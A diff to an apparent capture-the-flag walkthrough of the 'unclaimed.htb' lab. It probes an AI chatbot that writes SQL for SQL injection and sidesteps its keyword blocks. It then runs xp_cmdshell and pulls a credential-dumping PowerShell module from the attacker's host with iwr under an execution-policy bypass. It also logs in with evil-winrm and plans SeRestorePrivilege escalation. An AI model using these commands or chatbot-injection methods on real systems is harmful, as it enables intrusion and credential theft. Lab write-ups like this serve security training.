@@ -30,6 +30,7 @@ PORT     STATE SERVICE       VERSION
 
 - Visit the site:
     - ![image](./img-02.png)
+      <span class="caption">TracerBot, an AI assistant that turns baggage questions into SQL. Even a bare `status` gets a reply about whether to run a SQL query, a hint that our text ends up driving a query.</span>
 - Seems like a chatbot, lets try some SQLi cause it replies that it does SQL queries right
 - However, it blocks some keywords, so we cant straight up do SQLi over this chatbot
     - ![image](./img-03.png)
@@ -62,10 +63,14 @@ EXEC xp_cmdshell 'whoami /priv';` (just like we always first so id, sudo -l on l
 - Let's use `https://github.com/NetSPI/PowerUpSQL/blob/master/scripts/pending/Get-MSSQLCredentialPasswords.psm1` this script to try to find `svc_wtbackup`s password in the db
 - We first serve a python server on kali with the script in that directory, and run `iwr http://10.10.16.245:8000/Get-MSSQLCredentialPasswords.psm1 -o C:\Windows\Temp\Get-MSSQLCredentialPasswords.psm1`on the PS 
 - Then run these 4 commands to load it from disk
-> Set-ExecutionPolicy Bypass -Scope Process -Force
-Unblock-File C:\Windows\Temp\Get-MSSQLCredentialPasswords.psm1
-Import-Module C:\Windows\Temp\Get-MSSQLCredentialPasswords.psm1
-Get-MSSQLCredentialPasswords | Out-String
+
+    ```powershell
+    Set-ExecutionPolicy Bypass -Scope Process -Force
+    Unblock-File C:\Windows\Temp\Get-MSSQLCredentialPasswords.psm1
+    Import-Module C:\Windows\Temp\Get-MSSQLCredentialPasswords.psm1
+    Get-MSSQLCredentialPasswords | Out-String
+    ```
+
     - ![image](./img-15.png)
 - Because in the first recon we see winrm is open, let's finally use evil-winrm to login `evil-winrm -i unclaimed.htb -u svc_wtbackup -p '<password>'`
 - But I bumped in auth error! Why???
@@ -76,6 +81,7 @@ Get-MSSQLCredentialPasswords | Out-String
     - ![image](./img-17.png)
 - Login:
     - ![image](./img-18.png)
+      <span class="caption">An Evil-WinRM session as `unclaimed\svc_wtbackup`, using the password recovered with the fixed `datalength()` script.</span>
 - We have laterally moved to an account that has 
     - ![image](./img-19.png)
 - Can leverage `SeRestorePrivilege` for PE, let's use this script `https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1`
